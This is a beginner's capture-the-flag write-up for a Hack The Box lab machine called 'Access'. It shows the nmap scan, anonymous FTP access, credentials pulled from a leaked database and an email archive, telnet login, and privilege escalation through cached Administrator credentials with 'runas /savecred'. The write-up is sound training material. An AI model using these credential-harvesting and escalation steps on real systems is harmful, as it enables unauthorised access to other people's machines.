# Access Writeup

My first HTB writeup! Please be gentle.

## Getting User
I always start every box with a simple nmap scan.

`nmap -A  10.10.10.98`

```
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-30 21:41 PST
Nmap scan report for 10.10.10.98
Host is up (0.22s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst: W
|_  SYST: Windows_NT
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Vista SP2 (91%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 23/tcp)
HOP RTT       ADDRESS
1   222.88 ms 10.10.12.1
2   222.93 ms 10.10.10.98

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 195.79 seconds
```
There's a lot of information here, but there are a couple notable things to look at:

* Anonymous FTP login possible
* Telnet
* IIS 7.5 Webserver

The most promising approach would be to investigate FTP

### Digging into FTP
The first thing I like to do for services like FTP is banner grabbing for any additional information.

`ftp 10.10.10.98`
```
Connected to 10.10.10.98.
220 Microsoft FTP Service
Name (10.10.10.98:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
```

Looks like the machine is running the default Microsoft FTP server and also happens to be Windows NT. Digging around in FTP yields a pretty simple file structure

```
Access FTP
|-- Backups
|    |-- backup.mdb
|-- Engineer
     |-- Access Control.zip
```

`backup.mdb` appears to be some sort of legacy Microsoft database after some quick searching, and `Access Control.zip` is a password protected archive.

Opening `backup.mdb` in Microsoft Access gives us a lot of tables to look through. A lot of them are seemingly garbage, but a lot of them also contain employee personal information. The table that we're interested in is  `auth_user`, which contains usernames and passwords for various users.

```
admin : admin
engineer : access4u@security
backup_admin : admin
```

We now have three users to work with, and open telnet. Quick testing reveals that `admin` and `backup_admin` don't have accounts on the machine. `engineer` however, does, but is not a member of the `TelnetClients` group.

On further investigation, the password for  `engineer`, `access4u@security` works on the password protected archive `Access Control.zip` from earlier. The extraction reveals a new file, `Access Control.pst`. Opening the file with outlook gives us an email.

```
Hi there,

The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.

Regards,
John
```

On trying this new login with telnet, we get user:

```
Trying 10.10.10.98...
Connected to 10.10.10.98.
Escape character is '^]'.
Welcome to Microsoft Telnet Service 

login: security
password: 

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>
```

After navigating to the Desktop, we read `user.txt` and get the users flag.

## Getting Root

After some quick enumeration, we've got some idea of our environment. The machine is running Windows Server 2008 R2 with a seemingly standard setup.

After following this handy privesc checklist from [swisskyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md), it appears that there are cached credentials on the system!

`cmdkey /list`

```
Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
    Type: Domain Password
    User: ACCESS\Administrator
```

After some internet sleuthing, it the `runas` command can use cached credentials to run commands as another user.

```
runas /savecred /user:ACCESS\Administrator "cmd.exe /c type c:\users\administrator\desktop\root.txt > C:\users\security\test.txt
```

This reads root.txt as administrator and copies the output into a file we can read. `type test.txt` gets us the root flag.
